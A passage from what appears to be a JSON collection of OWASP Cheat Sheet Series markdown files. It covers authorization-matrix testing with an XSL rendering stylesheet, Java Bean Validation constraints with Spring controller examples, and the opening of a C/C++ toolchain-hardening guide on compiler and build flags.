and role specified.\r\n       *\r\n       * @param login User login\r\n       * @param role  Authorization logical role\r\n       * @return The JWT token\r\n       * @throws Exception If any error occurs during the creation\r\n       */\r\n      private String generateTestCaseAccessToken(String login, SecurityRole role) throws Exception {\r\n          return new AuthService().issueAccessToken(login, role);\r\n      }\r\n\r\n\r\n      /**\r\n       * Format a list of errors to a printable string\r\n       *\r\n       * @param errors Error list\r\n       * @return Printable string\r\n       */\r\n      private String formatErrorsList(List<String> errors) {\r\n          StringBuilder buffer = new StringBuilder();\r\n          errors.forEach(e -> buffer.append(e).append(\"\\n\"));\r\n          return buffer.toString();\r\n      }\r\n  }\r\n```\r\n\r\nIn case of detecting an authorization issue(s) the output is the following:\r\n\r\n```java\r\ntestAccessUsingAnonymousUserPointOfView(org.owasp.pocauthztesting.AuthorizationMatrixIT)\r\nTime elapsed: 1.009 s  ### FAILURE\r\njava.lang.AssertionError:\r\nAccess issues detected using the ANONYMOUS USER point of view:\r\n    The service 'DeleteMessage' when called with POV 'ANONYMOUS' return\r\n    a response code 200 that is not the expected one (403 expected).\r\n\r\n    The service 'CreateMessage' when called with POV 'ANONYMOUS' return\r\n    a response code 200 that is not the expected one (403 expected).\r\n\r\ntestAccessUsingBasicUserPointOfView(org.owasp.pocauthztesting.AuthorizationMatrixIT)\r\nTime elapsed: 0.05 s  ### FAILURE!\r\njava.lang.AssertionError:\r\nAccess issues detected using the BASIC USER point of view:\r\n    The service 'DeleteMessage' when called with POV 'BASIC' return\r\n    a response code 200 that is not the expected one (403 expected).\r\n```\r\n\r\n## Rendering of the authorization matrix for an audit / review\r\n\r\nEven if the authorization matrix is stored in a human-readable format (XML), it can be interesting to provide an on-the-fly rendering representation of the XML file in order to facilitate the review, audit and discussion about the authorization matrix in order to spot potential inconsistencies.\r\n\r\nThe Following XSL stylesheet can be used:\r\n\r\n``` xslt\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">\r\n  <xsl:template match=\"/\">\r\n    <html>\r\n      <head>\r\n        <title>Authorization Matrix</title>\r\n        <link rel=\"stylesheet\"\r\n        href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\"\r\n        integrity=\"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\"\r\n        crossorigin=\"anonymous\" />\r\n      </head>\r\n      <body>\r\n        <h3>Roles</h3>\r\n        <ul>\r\n          <xsl:for-each select=\"authorization-matrix/roles/role\">\r\n            <xsl:choose>\r\n              <xsl:when test=\"@name = 'ADMIN'\">\r\n                <div class=\"alert alert-warning\" role=\"alert\">\r\n                  <strong>\r\n                    <xsl:value-of select=\"@name\" />\r\n                  </strong>\r\n                  :\r\n                  <xsl:value-of select=\"@description\" />\r\n                </div>\r\n              </xsl:when>\r\n              <xsl:when test=\"@name = 'BASIC'\">\r\n                <div class=\"alert alert-info\" role=\"alert\">\r\n                  <strong>\r\n                    <xsl:value-of select=\"@name\" />\r\n                  </strong>\r\n                  :\r\n                  <xsl:value-of select=\"@description\" />\r\n                </div>\r\n              </xsl:when>\r\n              <xsl:otherwise>\r\n                <div class=\"alert alert-danger\" role=\"alert\">\r\n                  <strong>\r\n                    <xsl:value-of select=\"@name\" />\r\n                  </strong>\r\n                  :\r\n                  <xsl:value-of select=\"@description\" />\r\n                </div>\r\n              </xsl:otherwise>\r\n            </xsl:choose>\r\n          </xsl:for-each>\r\n        </ul>\r\n        <h3>Authorizations</h3>\r\n        <table class=\"table table-hover table-sm\">\r\n          <thead class=\"thead-inverse\">\r\n            <tr>\r\n              <th>Service</th>\r\n              <th>URI</th>\r\n              <th>Method</th>\r\n              <th>Role</th>\r\n            </tr>\r\n          </thead>\r\n          <tbody>\r\n            <xsl:for-each select=\"authorization-matrix/services/service\">\r\n              <xsl:variable name=\"service-name\" select=\"@name\" />\r\n              <xsl:variable name=\"service-uri\" select=\"@uri\" />\r\n              <xsl:variable name=\"service-method\" select=\"@http-method\" />\r\n              <xsl:for-each select=\"role\">\r\n                <tr>\r\n                  <td scope=\"row\">\r\n                    <xsl:value-of select=\"$service-name\" />\r\n                  </td>\r\n                  <td>\r\n                    <xsl:value-of select=\"$service-uri\" />\r\n                  </td>\r\n                  <td>\r\n                    <xsl:value-of select=\"$service-method\" />\r\n                  </td>\r\n                  <td>\r\n                    <xsl:variable name=\"service-role-name\" select=\"@name\" />\r\n                    <xsl:choose>\r\n                      <xsl:when test=\"@name = 'ADMIN'\">\r\n                        <div class=\"alert alert-warning\" role=\"alert\">\r\n                          <xsl:value-of select=\"@name\" />\r\n                        </div>\r\n                      </xsl:when>\r\n                      <xsl:when test=\"@name = 'BASIC'\">\r\n                        <div class=\"alert alert-info\" role=\"alert\">\r\n                          <xsl:value-of select=\"@name\" />\r\n                        </div>\r\n                      </xsl:when>\r\n                      <xsl:otherwise>\r\n                        <div class=\"alert alert-danger\" role=\"alert\">\r\n                          <xsl:value-of select=\"@name\" />\r\n                        </div>\r\n                      </xsl:otherwise>\r\n                    </xsl:choose>\r\n                  </td>\r\n                </tr>\r\n              </xsl:for-each>\r\n            </xsl:for-each>\r\n          </tbody>\r\n        </table>\r\n      </body>\r\n    </html>\r\n  </xsl:template>\r\n</xsl:stylesheet>\r\n```\r\n\r\nExample of the rendering:\r\n\r\n[object Promise]\r\n\r\n## Sources of the prototype\r\n\r\n[GitHub repository](https://github.com/righettod/poc-authz-testing)\r\n"
    },
    {
      "Bean_Validation_Cheat_Sheet.md": "# Bean Validation Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis article is focused on providing clear, simple, actionable guidance for providing Java Bean Validation security functionality in your applications.\r\n\r\nBean validation (JSR303 aka [Bean Validation 1.0](https://beanvalidation.org/1.0/spec/) /JSR349 aka [Bean Validation 1.1](https://beanvalidation.org/1.1/spec/)) is one of the most common ways to perform [input validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) in Java. It is an application layer agnostic validation spec which provides the developer with the means to define a set of validation constraints on a domain model and then perform validation of those constraints through out the various application tiers.\r\n\r\nOne advantage of this approach is that the validation constraints and the corresponding validators are only written once, thus reducing duplication of effort and ensuring uniformity:\r\n\r\n### Typical Validation\r\n\r\n[object Promise]\r\n\r\n### Bean Validation\r\n\r\n[object Promise]\r\n\r\n## Setup\r\n\r\nThe examples in this guide use Hibernate Validator (the reference implementation for Bean Validation 1.1).\r\n\r\nAdd Hibernate Validator to your **pom.xml**:\r\n\r\n```xml\r\n<dependency>\r\n   <groupId>org.hibernate</groupId>\r\n   <artifactId>hibernate-validator</artifactId>\r\n   <version>5.2.4.Final</version>\r\n</dependency>\r\n```\r\n\r\nEnable bean validation support in Spring's **context.xml**:\r\n\r\n```xml\r\n<beans:beans ...\r\n   ...\r\n   <mvc:annotation-driven />\r\n   ...\r\n</beans:beans>\r\n```\r\n\r\nFor more info, please see the [setup guide](https://hibernate.org/validator/documentation/getting-started/)\r\n\r\n## Basics\r\n\r\nIn order to get started using Bean Validation, you must add validation constraints (`@Pattern`, `@Digits`, `@Min`, `@Max`, `@Size`, `@Past`, `@Future`, `@CreditCardNumber`, `@Email`, `@URL`, etc.) to your model and then utilize the `@Valid` annotation when passing your model around in various application layers.\r\n\r\nConstraints can be applied in several places:\r\n\r\n- Fields\r\n- Properties\r\n- Classes\r\n\r\nFor Bean Validation 1.1 also on:\r\n\r\n- Parameters\r\n- Return values\r\n- Constructors\r\n\r\nFor the sake of simplicity all the examples below feature field constraints and all validation is triggered by the controller. Refer to the Bean Validation documentation for a full list of examples.\r\n\r\nWhen it comes to error handling, the Hibernate Validator returns a `BindingResult` object which contains a `List<ObjectError>`. The examples below feature simplistic error handling, while a production ready application would have a more elaborate design that takes care of logging and error page redirection.\r\n\r\n## Predefined Constraints\r\n\r\n### @Pattern\r\n\r\n**Annotation**:\r\n\r\n`@Pattern(regex=,flag=)`\r\n\r\n**Data Type**:\r\n\r\n`CharSequence`\r\n\r\n**Use**:\r\n\r\nChecks if the annotated string matches the regular expression regex considering the given flag match. Please visit [OWASP Validation Regex Repository](https://owasp.org/www-community/OWASP_Validation_Regex_Repository) for other useful regex's.\r\n\r\n**Reference**:\r\n\r\n[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)\r\n\r\n**Model**:\r\n\r\n```java\r\nimport org.hibernate.validator.constraints.Pattern;\r\n\r\npublic class Article  {\r\n //Constraint: Alpha Numeric article titles only using a regular expression\r\n @Pattern(regexp = \"[a-zA-Z0-9 ]\")\r\n private String articleTitle;\r\n public String getArticleTitle()  {\r\n  return  articleTitle;\r\n }\r\n public void setArticleTitle(String  articleTitle)  {\r\n   this.articleTitle  =  articleTitle;\r\n  }\r\n\r\n  ...\r\n\r\n}\r\n```\r\n\r\n**Controller**:\r\n\r\n```java\r\nimport javax.validation.Valid;\r\nimport com.company.app.model.Article;\r\n\r\n@Controller\r\npublic class ArticleController  {\r\n\r\n ...\r\n\r\n @RequestMapping(value = \"/postArticle\",  method = RequestMethod.POST)\r\n public @ResponseBody String postArticle(@Valid  Article  article,  BindingResult  result,\r\n HttpServletResponse  response) {\r\n  if (result.hasErrors()) {\r\n   String errorMessage  =  \"\";\r\n   response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\r\n   List<ObjectError> errors = result.getAllErrors();\r\n   for(ObjectError  e :  errors) {\r\n    errorMessage += \"ERROR: \" +  e.getDefaultMessage();\r\n   }\r\n   return  errorMessage;\r\n  } else {\r\n   return  \"Validation Successful\";\r\n  }\r\n }\r\n}\r\n```\r\n\r\n### @Digits\r\n\r\n**Annotation**:\r\n\r\n`@Digits(integer=,fraction=)`\r\n\r\n**Data Type**:\r\n\r\n`BigDecimal`, `BigInteger`, `CharSequence`, `byte`, `short`, `int`, `long` and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of Number\r\n\r\n**Use**:\r\n\r\nChecks whether the annotated value is a number having up to integer digits and fraction fractional digits\r\n\r\n**Reference**:\r\n\r\n[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)\r\n\r\n**Model**:\r\n\r\n```java\r\nimport org.hibernate.validator.constraints.Digits;\r\n\r\npublic class Customer {\r\n  //Constraint: Age can only be 3 digits long or less\r\n  @Digits(integer = 3, fraction = 0)\r\n  private int age;\r\n\r\n  public String getAge()  {\r\n    return age;\r\n  }\r\n\r\n  public void setAge(String age)  {\r\n      this.age = age;\r\n    }\r\n\r\n    ...\r\n}\r\n```\r\n\r\n**Controller**:\r\n\r\n```java\r\nimport javax.validation.Valid;\r\nimport com.company.app.model.Customer;\r\n\r\n@Controller\r\npublic class CustomerController  {\r\n\r\n ...\r\n\r\n @RequestMapping(value = \"/registerCustomer\",  method = RequestMethod.POST)\r\n public @ResponseBody String registerCustomer(@Valid Customer customer, BindingResult result,\r\n HttpServletResponse  response) {\r\n\r\n  if (result.hasErrors()) {\r\n   String errorMessage = \"\";\r\n   response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\r\n   List<ObjectError> errors = result.getAllErrors();\r\n\r\n   for( ObjectError  e :  errors) {\r\n    errorMessage += \"ERROR: \"  +  e.getDefaultMessage();\r\n   }\r\n   return  errorMessage;\r\n  } else {\r\n   return  \"Validation Successful\";\r\n  }\r\n }\r\n}\r\n```\r\n\r\n### @Size\r\n\r\n**Annotation**:\r\n\r\n`@Size(min=,` `max=)`\r\n\r\n**Data Type**:\r\n\r\n`CharSequence`, `Collection`, `Map` and `Arrays`\r\n\r\n**Use**:\r\n\r\nChecks if the annotated element's size is between min and max (inclusive)\r\n\r\n**Reference**:\r\n\r\n[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)\r\n\r\n**Model**:\r\n\r\n```java\r\nimport org.hibernate.validator.constraints.Size;\r\n\r\npublic class Message {\r\n\r\n   //Constraint: Message must be at least 10 characters long, but less than 500\r\n   @Size(min = 10, max = 500)\r\n   private String message;\r\n\r\n   public String getMessage() {\r\n      return message;\r\n   }\r\n\r\n   public void setMessage(String message) {\r\n      this.message = message;\r\n   }\r\n\r\n...\r\n}\r\n```\r\n\r\n**Controller**:\r\n\r\n```java\r\nimport javax.validation.Valid;\r\nimport com.company.app.model.Message;\r\n\r\n@Controller\r\npublic class MessageController {\r\n\r\n...\r\n\r\n@RequestMapping(value=\"/sendMessage\", method=RequestMethod.POST)\r\npublic @ResponseBody String sendMessage(@Valid Message message, BindingResult result,\r\nHttpServletResponse response){\r\n\r\n   if(result.hasErrors()){\r\n      String errorMessage = \"\";\r\n      response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\r\n      List<ObjectError> errors = result.getAllErrors();\r\n      for( ObjectError e : errors){\r\n         errorMessage+= \"ERROR: \" + e.getDefaultMessage();\r\n      }\r\n      return errorMessage;\r\n   }\r\n   else{\r\n      return \"Validation Successful\";\r\n   }\r\n}\r\n}\r\n```\r\n\r\n### @Past / @Future\r\n\r\n**Annotation**:\r\n\r\n`@Past,` `@Future`\r\n\r\n**Data Type**:\r\n\r\n`java.util.Date`, `java.util.Calendar`, `java.time.chrono.ChronoZonedDateTime`, `java.time.Instant`, `java.time.OffsetDateTime`\r\n\r\n**Use**:\r\n\r\nChecks whether the annotated date is in the past / future\r\n\r\n**Reference**:\r\n\r\n[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)\r\n\r\n**Model**:\r\n\r\n```java\r\nimport org.hibernate.validator.constraints.Past;\r\nimport org.hibernate.validator.constraints.Future;\r\n\r\npublic class DoctorVisit {\r\n\r\n   //Constraint: Birthdate must be in the past\r\n   @Past\r\n   private Date birthDate;\r\n\r\n   public Date getBirthDate() {\r\n      return birthDate;\r\n   }\r\n\r\n   public void setBirthDate(Date birthDate) {\r\n      this.birthDate = birthDate;\r\n   }\r\n\r\n   //Constraint: Schedule visit date must be in the future\r\n   @Future\r\n   private String scheduledVisitDate;\r\n\r\n   public String getScheduledVisitDate() {\r\n      return scheduledVisitDate;\r\n   }\r\n\r\n   public void setScheduledVisitDate(String scheduledVisitDate) {\r\n      this.scheduledVisitDate = scheduledVisitDate;\r\n   }\r\n\r\n...\r\n}\r\n```\r\n\r\n**Controller**:\r\n\r\n```java\r\nimport javax.validation.Valid;\r\nimport com.company.app.model.DoctorVisit;\r\n\r\n@Controller\r\npublic class DoctorVisitController {\r\n\r\n   ...\r\n\r\n   @RequestMapping(value=\"/scheduleVisit\", method=RequestMethod.POST)\r\n   public @ResponseBody String scheduleVisit(@Valid DoctorVisit doctorvisit, BindingResult result,\r\n   HttpServletResponse response){\r\n\r\n      if(result.hasErrors()){\r\n         String errorMessage = \"\";\r\n         response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\r\n         List<ObjectError> errors = result.getAllErrors();\r\n         for( ObjectError e : errors){\r\n            errorMessage+= \"ERROR: \" + e.getDefaultMessage();\r\n         }\r\n         return errorMessage;\r\n      }\r\n      else{\r\n         return \"Validation Successful\";\r\n      }\r\n   }\r\n}\r\n```\r\n\r\n### Combining Constraints\r\n\r\nValidation annotations can be combined in any suitable way. For instance, to specify a valid reviewRating value between 1 and 5, specify the validation like this :\r\n\r\n**Annotation**:\r\n\r\n`@Min(value=),` `@Max(value=)`\r\n\r\n**Data Type**:\r\n\r\n`BigDecimal`, `BigInteger`, `byte`, `short`, `int`, `long` and the respective wrappers of the primitive types; Additionally supported by HV: any sub-type of `CharSequence` (the numeric value represented by the character sequence is evaluated), any sub-type of Number\r\n\r\n**Use**:\r\n\r\nChecks whether the annotated value is higher/lower than or equal to the specified minimum\r\n\r\n**Reference:**\r\n\r\n[Documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#section-builtin-constraints)\r\n\r\n**Model**:\r\n\r\n```java\r\nimport org.hibernate.validator.constraints.Min;\r\nimport org.hibernate.validator.constraints.Max;\r\n\r\npublic class Review {\r\n\r\n //Constraint: Review rating must be between 1 and 5\r\n @Min(1)\r\n @Max(5)\r\n private int reviewRating;\r\n\r\n public int getReviewRating() {\r\n   return reviewRating;\r\n }\r\n\r\n public void setReviewRating(int reviewRating) {\r\n   this.reviewRating = reviewRating;\r\n}\r\n ...\r\n}\r\n```\r\n\r\n**Controller**:\r\n\r\n```java\r\nimport javax.validation.Valid;\r\nimport com.company.app.model.ReviewRating;\r\n\r\n@Controller\r\npublic class ReviewController {\r\n\r\n   ...\r\n\r\n   @RequestMapping(value=\"/postReview\", method=RequestMethod.POST)\r\n   public @ResponseBody String postReview(@Valid Review review, BindingResult result,\r\n   HttpServletResponse response){\r\n\r\n      if(result.hasErrors()){\r\n         String errorMessage = \"\";\r\n         response.setStatus(HttpServletResponse.SC_BAD_REQUEST);\r\n         List<ObjectError> errors = result.getAllErrors();\r\n         for( ObjectError e : errors){\r\n            errorMessage+= \"ERROR: \" + e.getDefaultMessage();\r\n         }\r\n         return errorMessage;\r\n      }\r\n       else{\r\n         return \"Validation Successful\";\r\n      }\r\n   }\r\n}\r\n```\r\n\r\n### Cascading Constraints\r\n\r\nValidating one bean is a good start, but often, beans are nested or in a complete graph of beans. To validate that graph in one go, apply cascading validation with [@Valid](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch03.html#_cascaded_validation)\r\n\r\n### Additional Constraints\r\n\r\nIn addition to providing the complete set of JSR303 constraints, Hibernate Validator also defines some additional constraints for convenience:\r\n\r\n- `@CreditCardNumber`\r\n- `@EAN`\r\n- `@Email`\r\n- `@Length`\r\n- `@Range`\r\n- `@ScriptAssert`\r\n- `@URL`\r\n\r\nTake a look at this [table](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch02.html#table-custom-constraints) for the complete list.\r\n\r\nNote that `@SafeHtml`, a previously valid constraint, has been deprecated according to the [Hibernate Validator 6.1.0.Final and 6.0.18.Final release blogpost](https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/). Please refrain from using the `@SafeHtml` constraint.\r\n\r\n## Custom Constraints\r\n\r\nOne of the most powerful features of bean validation is the ability to define your own constraints that go beyond the simple validation offered by built-in constraints.\r\n\r\nCreating custom constraints is beyond the scope of this guide. Please see this [documentation](https://docs.jboss.org/hibernate/validator/5.2/reference/en-US/html/ch06.html).\r\n\r\n## Error Messages\r\n\r\nIt is possible to specify a message ID with the validation annotation, so that error messages are customized :\r\n\r\n```java\r\n@Pattern(regexp = \"[a-zA-Z0-9 ]\", message=\"article.title.error\")\r\nprivate String articleTitle;\r\n```\r\n\r\nSpring MVC will then look up a message with ID *article.title.error* in a defined MessageSource. More on this [documentation](https://www.silverbaytech.com/2013/04/16/custom-messages-in-spring-validation/).\r\n"
    },
    {
      "C-Based_Toolchain_Hardening_Cheat_Sheet.md": "# C-Based Toolchain Hardening Cheat Sheet\r\n\r\n## Introduction\r\n\r\nC-Based Toolchain Hardening is a treatment of project settings that will help you deliver reliable and secure code when using C, C++ and Objective C languages in a number of development environments. This article will examine Microsoft and GCC toolchains for the C, C++ and Objective C languages. It will guide you through the steps you should take to create executables with firmer defensive postures and increased integration with the available platform security. Effectively configuring the toolchain also means your project will enjoy a number of benefits during development, including enhanced warnings and static analysis, and self-debugging code.\r\n\r\nThere are four areas to be examined when hardening the toolchain: configuration, preprocessor, compiler, and linker. Nearly all areas are overlooked or neglected when setting up a project. The neglect appears to be pandemic, and it applies to nearly all projects including Auto-configured projects, Makefile-based, Eclipse-based, Visual Studio-based, and Xcode-based. Its important to address the gaps at configuration and build time because its difficult to impossible to [add hardening on a distributed executable after the fact](https://sourceware.org/ml/binutils/2012-03/msg00309.html) on some platforms.\r\n\r\nThis is a prescriptive article, and it will not debate semantics or speculate on behavior. Some information, such as the C/C++ committee's motivation and pedigree for [`program diagnostics`, `NDEBUG`, `assert`, and `abort()`](https://groups.google.com/a/isocpp.org/forum/?fromgroups=#!topic/std-discussion/ak8e1mzBhGs), appears to be lost like a tale in the Lord of the Rings. As such, the article will specify semantics (for example, the philosophy of 'debug' and 'release' build configurations), assign behaviors (for example, what an assert should do in a 'debug' and 'release' build configurations), and present a position. If you find the posture is too aggressive, then you should back off as required to suite your taste.\r\n\r\nA secure toolchain is not a silver bullet. It is one piece of an overall strategy in the engineering process to help ensure success. It will compliment existing processes such as static analysis, dynamic analysis, secure coding, negative test suites, and the like. Tools such as Valgrind and Helgrind will still be needed. And a project will still require solid designs and architectures.\r\n\r\nThe OWASP [ESAPI C++](https://code.google.com/p/owasp-esapi-cplusplus/source) project eats its own dog food. Many of the examples you will see in this article come directly from the ESAPI C++ project.\r\n\r\nFinally, a Cheat Sheet is available for those who desire a terse treatment of the material. Please visit [C-Based Toolchain Hardening Cheat Sheet](C-Based_Toolchain_Hardening_Cheat_Sheet.md) for the abbreviated version.\r\n\r\n## Wisdom\r\n\r\nCode **must** be correct. It **should** be secure. It **can** be efficient.\r\n\r\n[Dr. Jon Bentley](https://en.wikipedia.org/wiki/Jon_Bentley): *\"If it doesn't have to be correct, I can make it as fast as you'd like it to be\"*.\r\n\r\n[Dr. Gary McGraw](https://en.wikipedia.org/wiki/Gary_McGraw): *\"Thou shalt not rely solely on security features and functions to build secure software as security is an emergent property of the entire system and thus relies on building and integrating all parts properly\"*.\r\n\r\n## Configuration\r\n\r\nConfiguration is the first opportunity to configure your project for success. Not only do you have to configure your project to meet reliability and security goals, you must also configure integrated libraries properly. You typically have has three choices. First, you can use auto-configuration utilities if on Linux or Unix. Second, you can write a makefile by hand. This is predominant on Linux, macOS, and Unix, but it applies to Windows as well. Finally, you can use an integrated development environment or IDE.\r\n\r\n### Build Configurations\r\n\r\nAt this stage in the process, you should concentrate on configuring for two builds: Debug and Release. Debug will be used for development and include full instrumentation. Release will be configured for production. The difference between the two settings is usually *optimization level* and *debug level*. A third build configuration is Test, and its usually a special case of Release.\r\n\r\nFor debug and release builds, the settings are typically diametrically opposed. Debug configurations have no optimizations and full debug information; while Release builds have optimizations and minimal to moderate debug information. In addition, debug code has full assertions and additional library integration, such as mudflaps and malloc guards such as `dmalloc`.\r\n\r\nThe Test configuration is often a Release configuration that makes everything public for testing and builds a test harness. For example, all member functions public (C++ class) and all interfaces (library or shared object) should be made available for testing. Many Object Oriented purist oppose testing private interfaces, but this is not about object oriented-ness. This (*q.v.*) is about building reliable and secure software.\r\n\r\n[GCC 4.8](https://gcc.gnu.org/gcc-4.8/changes.html) introduced an optimization of `-Og`. Note that it is only an optimization, and still requires a customary debug level via `-g`.\r\n\r\n#### Debug Builds\r\n\r\nDebug builds are where developers spend most of their time when vetting problems, so this build should concentrate forces and tools or be a 'force multiplier'. Though many do not realize, debug code is more highly valued than release code because its adorned with additional instrumentation. The debug instrumentation will cause a program to become nearly \"self-debugging\", and help you catch mistakes such as bad parameters, failed API calls, and memory problems.\r\n\r\nSelf-debugging code reduces your time during trouble shooting and debugging. Reducing time under the debugger means you have more time for development and feature requests. If code is checked in without debug instrumentation, it should be fixed by adding instrumentation or rejected.\r\n\r\nFor GCC, optimizations and debug symbolication are controlled through two switches: `-O` and `-g`. You should use the following as part of your `CFLAGS` and `CXXFLAGS` for a minimal debug session:\r\n\r\n```text\r\n-O0 -g3 -ggdb\r\n```\r\n\r\n`-O0` turns off optimizations and `-g3` ensures maximum debug information is available. You may need to use `-O1` so some analysis is performed. Otherwise, your debug build will be missing a number of warnings not present in release builds. `-g3` ensures maximum debugging information is available for the debug session, including symbolic constants and `#defines`. `-ggdb` includes extensions to help with a debug session under GDB. For completeness, Jan Krachtovil stated `-ggdb` currently has no effect in a private email.\r\n\r\nRelease builds should also consider the configuration pair of `-mfunction-return=thunk` and `-mindirect-branch=thunk`. These are the \"Reptoline\" fix which is an indirect branch used to thwart speculative execution CPU vulnerabilities such as Spectre and Meltdown. The CPU cannot tell what code to `speculatively` execute because it is an indirect (as opposed to a direct) branch. This is an extra layer of indirection, like calling a pointer through a pointer.\r\n\r\nDebug build should also define `DEBUG`, and ensure `NDEBUG` is not defined. `NDEBUG` removes \"program diagnostics\"; and has undesirable behavior and side effects which discussed below in more detail. The defines should be present for all code, and not just the program. You use it for all code (your program and included libraries) because you need to know how they fail too (remember, you take the bug report - not the third party library).\r\n\r\nIn addition, you should use other relevant flags, such as `-fno-omit-frame-pointer`. Ensuring a frame pointer exists makes it easier to decode stack traces. Since debug builds are not shipped, its OK to leave symbols in the executable. Programs with debug information do not suffer performance hits. See, for example, [How does the gcc -g option affect performance?](https://gcc.gnu.org/ml/gcc-help/2005-03/msg00032.html)\r\n\r\nFinally, you should ensure your project includes additional diagnostic libraries, such as `dmalloc` and [Address Sanitizer](https://github.com/google/sanitizers/tree/master/hwaddress-sanitizer). A comparison of some memory checking tools can be found at [Comparison Of Memory Tools](https://github.com/google/sanitizers/wiki/AddressSanitizerComparisonOfMemoryTools). If you don't include additional diagnostics in debug builds, then you should start using them sinces its OK to find errors you are not looking for.\r\n\r\n#### Release Builds\r\n\r\nRelease builds are what your customer receives. They are meant to be run on production hardware and servers, and they should be reliable, secure, and efficient. A stable release build is the product of the hard work and effort during development.\r\n\r\nFor release builds, you should use the following as part of `CFLAGS` and `CXXFLAGS` for release builds:\r\n\r\n```text\r\n-On -g2\r\n```\r\n\r\n`-O`*`n`* sets optimizations for speed or size (for example, `-Os` or `-O2`), and `-g2` ensure debugging information is created.\r\n\r\nDebugging information should be stripped and retained in case of symbolication for a crash report from the field. While not desired, debug information can be left in place without a performance penalty. See *[How does the gcc -g option affect performance?](https://gcc.gnu.org/ml/gcc-help/2005-03/msg00032.html)* for details.\r\n\r\nRelease builds should also define `NDEBUG`, and ensure `DEBUG` is not defined. The time for debugging and diagnostics is over, so users get production code with full optimizations, no \"programming diagnostics\", and other efficiencies. If you can't optimize or your are performing excessive logging, it usually means the program is not ready for production.\r\n\r\nIf you have been relying on an `assert` and then a subsequent `abort()`, you have been abusing \"program diagnostics\" since it has no place in production code. If you want a memory dump, create one so users don't have to worry about secrets and other sensitive information being written to the filesystem and emailed in plain text.\r\n\r\nFor Windows, you would use `/Od` for debug builds; and `/Ox`, `/O2` or `/Os` for release builds. See Microsoft's [/O Options (Optimize Code)](https://docs.microsoft.com/en-us/cpp/build/reference/o-options-optimize-code) for details.\r\n\r\n#### Test Builds\r\n\r\nTest builds are used to provide heuristic validation by way of positive and negative test suites. Under a test configuration, all interfaces are tested to ensure they perform to specification and satisfaction. \"Satisfaction\" is subjective, but it should include no crashing and no trashing of your memory arena, even when faced with negative tests.\r\n\r\nBecause all interfaces are tested (and not just the public ones), your `CFLAGS` and `CXXFLAGS` should include:\r\n\r\n```text\r\n-Dprotected=public -Dprivate=public\r\n```\r\n\r\nYou should also change `__attribute__` `((visibility` `(\"hidden\")))` to `__attribute__` `((visibility` `(\"default\")))`.\r\n\r\nNearly everyone gets a positive test right, so no more needs to be said. The negative self tests are much more interesting, and you should concentrate on trying to make your program fail so you can verify it fails gracefully. Remember, a bad actor is not going to be courteous when they attempt to cause your program to fail. And it's your project that takes egg on the face by way of a bug report or guest appearance on [Full Disclosure](https://nmap.org/mailman/listinfo/fulldisclosure) or [Bugtraq](https://www.securityfocus.com/archive) - not `<some library>` you included.\r\n\r\n### Auto Tools\r\n\r\nAuto configuration tools are popular on many Linux and Unix based systems, and the tools include *Autoconf*, *Automake*, *config*, and *Configure*. The tools work together to produce project files from scripts and template files. After the process completes, your project should be setup and ready to be made with `make`.\r\n\r\nWhen using auto configuration tools, there are a few files of interest worth mentioning. The files are part of the auto tools chain and include `m4` and the various `*.in`, `*.ac` (autoconf), and `*.am` (automake) files. At times, you will have to open them, or the resulting makefiles, to tune the \"stock\" configuration.\r\n\r\nThere are three downsides to the command-line configuration tools in the toolchain: (1) they often ignore user requests, (2) they cannot create configurations, and (3) security is often not a goal.\r\n\r\nTo demonstrate the first issue, confider your project with the following: `configure` `CFLAGS=\"-Wall` `-fPIE\"` `CXXFLAGS=\"-Wall` `-fPIE\"` `LDFLAGS=\"-pie\"`. You will probably find the auto tools ignored your request, which means the command below will not produce expected results. As a work around, you will have to open an `m4` scripts, `Makefile.in` or `Makefile.am` and fix the configuration.\r\n\r\n```bash\r\n$ configure CFLAGS=\"-Wall -Wextra -Wconversion -fPIE -Wno-unused-parameter\r\n    -Wformat=2 -Wformat-security -fstack-protector-all -Wstrict-overflow\"\r\n    LDFLAGS=\"-pie -z,noexecstack -z,noexecheap -z,relro -z,now\"\r\n```\r\n\r\nFor the second point, you will probably be disappointed to learn [Automake does not support the concept of configurations](https://lists.gnu.org/archive/html/automake/2012-12/msg00019.html). Its not entirely Autoconf's or Automake's fault - *Make* and its inability to detect changes is the underlying problem. Specifically, *Make* only [checks modification times of prerequisites and targets](https://pubs.opengroup.org/onlinepubs/9699919799/utilities/make.html), and does not check things like `CFLAGS` and `CXXFLAGS`. The net effect is you will not receive expected results when you issue `make` `debug` and then `make` `test` or `make` `release`.\r\n\r\nFinally, you will probably be disappointed to learn tools such as Autoconf and Automake miss many security related opportunities and ship insecure out of the box. There are a number of compiler switches and linker flags that improve the defensive posture of a program, but they are not 'on' by default. Tools like Autoconf - which are supposed to handle this situation - often provides setting to serve the lowest of all denominators.\r\n\r\nA recent discussion on the Automake mailing list illuminates the issue: *[Enabling compiler warning flags](https://lists.gnu.org/archive/html/autoconf/2012-12/msg00038.html)*. Attempts to improve default configurations were met with resistance and no action was taken. The resistance is often of the form, \"`<some useful warning> also produces false positives`\" or \"`<some obscure platform> does not support <established security feature>`\". Its noteworthy that David Wheeler, the author of *[Secure Programming for Linux and Unix 